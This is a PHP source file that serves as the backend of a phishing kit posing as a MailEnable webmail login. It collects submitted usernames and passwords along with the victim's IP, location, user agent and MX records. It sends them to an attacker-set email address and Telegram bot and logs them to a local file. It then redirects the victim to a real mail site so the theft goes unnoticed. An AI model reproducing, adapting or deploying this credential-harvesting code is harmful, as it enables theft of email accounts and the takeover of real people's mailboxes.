<?php 
header("Access-Control-Allow-Headers: Authorization, Content-Type");
header("Access-Control-Allow-Origin: *");
header('content-type: application/json; charset=utf-8');

// ==========================================
// Auto-detect and load config.php
// ==========================================
function loadConfig() {
    // Possible paths to check for config.php
    $possiblePaths = [
        __DIR__ . '/config.php',           // Same directory
        dirname(__DIR__) . '/config.php',  // Parent directory
        __DIR__ . '/../config.php',        // One level up
        __DIR__ . '/../../config.php',     // Two levels up
        $_SERVER['DOCUMENT_ROOT'] . '/config.php', // Document root
        $_SERVER['DOCUMENT_ROOT'] . '/../config.php', // Above document root
        '/etc/config.php',                 // System-wide config
    ];

    foreach ($possiblePaths as $path) {
        if (file_exists($path)) {
            require_once $path;
            return true;
        }
    }

    // If config not found, try to find it recursively
    $dir = __DIR__;
    for ($i = 0; $i < 5; $i++) {
        $dir = dirname($dir);
        $configPath = $dir . '/config.php';
        if (file_exists($configPath)) {
            require_once $configPath;
            return true;
        }
    }

    return false;
}

// Load configuration
if (!loadConfig()) {
    // Fallback to hardcoded values if config not found
    define('EMAIL', 'email here');
    define('TG_TOKEN', 'enter token');
    define('TG_CHAT_ID', 'chat id');
    define('SUBMIT', '2');
}

// ==========================================
// Use configuration values
// ==========================================
$Receive_email = EMAIL;
$telegramBotToken = TG_TOKEN;
$telegramChatId = TG_CHAT_ID;
$submitLimit = defined('SUBMIT') ? SUBMIT : 2;

// ==========================================
// Session tracking for submission counting
// ==========================================
function getSessionIdentifier() {
    global $session_folder;
    
    if (isset($session_folder) && !empty($session_folder)) {
        return $session_folder;
    }
    
    // Generate a session ID based on IP and date
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    return md5($ip . date('Y-m-d'));
}

// Initialize session tracking
$sessionId = getSessionIdentifier();
$sessionFile = sys_get_temp_dir() . '/' . $sessionId . '_submissions.txt';

// Check submission count
$submissionCount = 0;
if (file_exists($sessionFile)) {
    $submissionCount = (int)file_get_contents($sessionFile);
}

// ==========================================
// Process the request
// ==========================================
$user = isset($_POST['user']) ? trim($_POST['user']) : '';
$pass = isset($_POST['pass']) ? trim($_POST['pass']) : '';
$userDomain = isset($_POST['userDomain']) ? trim($_POST['userDomain']) : '';

if ($pass != null) {
    // Check if submission limit is reached
    if ($submissionCount >= $submitLimit) {
        // Still redirect but don't log/send
        if (!empty($userDomain)) {
            header("Location: https://$userDomain");
        } else {
            header("Location: https://www.mailenable.com");
        }
        exit();
    }
    
    // Increment submission count
    $submissionCount++;
    file_put_contents($sessionFile, $submissionCount);
    
    // ==========================================
    // Get additional information
    // ==========================================
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Get country based on IP with fallback
    $country = "Unknown";
    try {
        $countryData = @file_get_contents("https://ipapi.co/$ip/country_name/");
        if ($countryData !== false && !empty(trim($countryData))) {
            $country = trim($countryData);
        }
    } catch (Exception $e) {
        $country = "Unknown";
    }

    // Fallback to ip-api.com if ipapi.co fails
    if ($country === "Unknown") {
        $geoData = @file_get_contents("http://ip-api.com/json/$ip");
        if ($geoData !== false) {
            $geoJson = json_decode($geoData, true);
            if ($geoJson && isset($geoJson['status']) && $geoJson['status'] === 'success') {
                $country = $geoJson['country'] ?? 'Unknown';
            }
        }
    }

    // Extract email domain
    if (empty($userDomain) && strpos($user, '@') !== false) {
        $userDomain = substr(strrchr($user, "@"), 1);
    }

    // Get MX Record
    $mxRecords = @dns_get_record($userDomain, DNS_MX);
    $mxRecordString = "No MX Records Found";
    $webmailL0gin = "Not Available";
    
    if (!empty($mxRecords)) {
        $mxRecordString = implode(", ", array_column($mxRecords, 'target'));
        $mxDomain = $mxRecords[0]['target'];

        // Known mappings for email providers (including MailEnable specific)
        $webmailMapping = [
            // MailEnable specific mappings
            'mailenable.com' => 'https://www.mailenable.com',
            'mx.mailenable.com' => 'https://www.mailenable.com',
            'mailenable' => 'https://www.mailenable.com',
            'mewebmail.com' => 'https://www.mewebmail.com',
            'mx.mewebmail.com' => 'https://www.mewebmail.com',
            
            // Common MailEnable hosting providers
            'webmail.yourdomain.com' => 'https://webmail.yourdomain.com',
            'mail.yourdomain.com' => 'https://mail.yourdomain.com',
            'smartermail.com' => 'https://www.smartertools.com/smartermail',
            'smartertools.com' => 'https://www.smartertools.com/smartermail',
            
            // Top European email providers
            'mx.yandex.ru' => 'https://mail.yandex.com',
            'mx.mail.ru' => 'https://mail.ru',
            'mx.ukr.net' => 'https://mail.ukr.net',
            'mx.gmx.net' => 'https://mail.gmx.com',
            'mx.orange.fr' => 'https://webmail.orange.fr',
            'mx.protonmail.ch' => 'https://mail.proton.me',
            'mx.web.de' => 'https://web.de',
            'mx.vodafone.it' => 'https://mail.vodafone.it',
            'mx.libero.it' => 'https://mail.libero.it',
            'mx.tiscali.it' => 'https://mail.tiscali.it',

            // Turkish email providers
            'mx.turktelekom.com.tr' => 'https://webmail.turktelekom.com.tr',
            'mx.superonline.net' => 'https://mail.superonline.net',
            'mx.turk.net' => 'https://mail.turk.net',

            // Spanish email providers
            'mx.telefonica.net' => 'https://webmail.telefonica.net',
            'mx.movistar.es' => 'https://correo.movistar.es',

            // Brazilian email providers
            'mx.uol.com.br' => 'https://email.uol.com.br',
            'mx.terra.com.br' => 'https://webmail.terra.com.br',
            'mx.bol.com.br' => 'https://email.bol.com.br',

            // Generic mappings for international providers
            'stackmail.com' => 'https://stackmail.com',
            'ionos.com' => 'https://mail.ionos.com',
            'appsuite.com' => 'https://mail.appsuite.com',
            '1and1.com' => 'https://mail.ionos.com',
            'titan.email' => 'https://mail.titan.email',
            'zoho.com' => 'https://mail.zoho.com',
            'zoho.in' => 'https://mail.zoho.in',
            'zoho.eu' => 'https://mail.zoho.eu',
            'hostinger.com' => 'https://mail.hostinger.com',
            'secureserver.net' => 'https://email.godaddy.com',
            'google.com' => 'https://mail.google.com',
            'gmail.com' => 'https://mail.google.com',
            'mxhichina' => 'https://mail.mxhichina.com/alimail/',
            'emailsrvr.com' => 'https://apps.rackspace.com',
            'aruba.it' => 'https://webmail.aruba.it/',
            
            // Korean email providers
            'naver.com' => 'https://mail.naver.com',
            'daum.net' => 'https://mail.daum.net',
            'hanmail.net' => 'https://mail.daum.net',
            'nate.com' => 'https://mail.nate.com',
            'korea.com' => 'https://mail.korea.com',
            'dreamwiz.com' => 'https://mail.dreamwiz.com',
            'freechal.com' => 'https://mail.freechal.com',
            'empas.com' => 'https://mail.empas.com',
            'paran.com' => 'https://mail.paran.com',
            'lycos.co.kr' => 'https://mail.lycos.co.kr',
            'yahoo.co.kr' => 'https://mail.yahoo.com',
            
            // Chinese email providers
            'qq.com' => 'https://mail.qq.com',
            '163.com' => 'https://mail.163.com',
            '126.com' => 'https://mail.126.com',
            'sina.com' => 'https://mail.sina.com.cn',
            'sohu.com' => 'https://mail.sohu.com',
            'tom.com' => 'https://mail.tom.com',
            '21cn.com' => 'https://mail.21cn.com',
            'yeah.net' => 'https://mail.yeah.net',
            
            // Yahoo
            'yahoo.com' => 'https://mail.yahoo.com',
            'yahoo.co.uk' => 'https://mail.yahoo.com',
            'yahoo.co.jp' => 'https://mail.yahoo.co.jp',
            'ymail.com' => 'https://mail.yahoo.com',
            'rocketmail.com' => 'https://mail.yahoo.com',
            
            // AT&T Yahoo
            'att.net' => 'https://currently.att.yahoo.com',
            'sbcglobal.net' => 'https://currently.att.yahoo.com',
            'bellsouth.net' => 'https://currently.att.yahoo.com',
            
            // Mailgun
            'mailgun.org' => 'https://login.mailgun.com/login/',
            'mailgun.com' => 'https://login.mailgun.com/login/',
            
            // Horde
            'horde.org' => 'https://www.horde.org/apps/webmail',
            'cpanel.net' => 'https://webmail.cpanel.net',
            'cpanel.com' => 'https://webmail.cpanel.net',
            
            // OVH / OVHcloud
            'ovh.net' => 'https://webmail.ovh.net',
            'ovhcloud.com' => 'https://webmail.ovhcloud.com',
        ];

        // Determine webmail L0gin URL
        if (strpos($mxDomain, 'natrohost.com') !== false) {
            $webmailL0gin = "https://mail." . $userDomain;
        } else {
            foreach ($webmailMapping as $key => $url) {
                if (strpos($mxDomain, $key) !== false) {
                    $webmailL0gin = $url;
                    break;
                }
            }
        }

        // Default to webmail.domain if no mapping is found
        if ($webmailL0gin === "Not Available") {
            $webmailL0gin = "https://webmail." . $userDomain;
        }
    }

    // ==========================================
    // Construct the message
    // ==========================================
    $message = "------------------------\n";
    $message .= "Page           : MailEnable\n";
    $message .= "usr            : $user\n";
    $message .= "Ps             : $pass\n";
    $message .= "Country        : $country\n";
    $message .= "Timestamp      : " . date("Y-m-d H:i:s") . "\n";
    $message .= "Hostname       : $hostname\n";
    $message .= "Webmail L0gin  : $webmailL0gin\n";
    $message .= "MX Records     : $mxRecordString\n";
    $message .= "----------------------------------\n";
    $message .= "IP             : $ip\n";
    $message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent     : $useragent\n";
    $message .= "Submission #   : $submissionCount of $submitLimit\n";
    $message .= "-----------------------\n";

    // ==========================================
    // Send the email with error suppression
    // ==========================================
    $subject = "Mailenable | $user | $country | $ip";
    @mail($Receive_email, $subject, $message);

    // ==========================================
    // Write to the text file with proper path handling
    // ==========================================
    $filePath = __DIR__ . "/d@main123.txt";
    if ($fileHandler = @fopen($filePath, "a")) {
        @fwrite($fileHandler, $message);
        @fclose($fileHandler);
    } else {
        error_log("Unable to write to file: $filePath");
    }

    // ==========================================
    // Send message to Telegram with error suppression
    // ==========================================
    $telegramMessage = urlencode($message);
    @file_get_contents("https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatId&text=$telegramMessage");

    // ==========================================
    // Response
    // ==========================================
    $signal = 'ok';
    $msg = 'Valid Credentials';
} else {
    $signal = 'error_log';
    $msg = 'Invalid Credentials';
}

// ==========================================
// Redirect to MailEnable or user's domain
// ==========================================
if (!empty($userDomain)) {
    // Check if it's a MailEnable related domain
    $mailenableDomains = ['mailenable.com', 'mewebmail.com', 'smartermail.com', 'smartertools.com'];
    $domainLower = strtolower($userDomain);
    $isMailEnable = false;
    foreach ($mailenableDomains as $mailenableDomain) {
        if (strpos($domainLower, $mailenableDomain) !== false) {
            $isMailEnable = true;
            break;
        }
    }
    
    if ($isMailEnable) {
        header("Location: https://www.mailenable.com");
    } else {
        // Try to redirect to webmail subdomain or mail subdomain
        header("Location: https://webmail.$userDomain");
    }
} else {
    header("Location: https://www.mailenable.com");
}
exit();
?>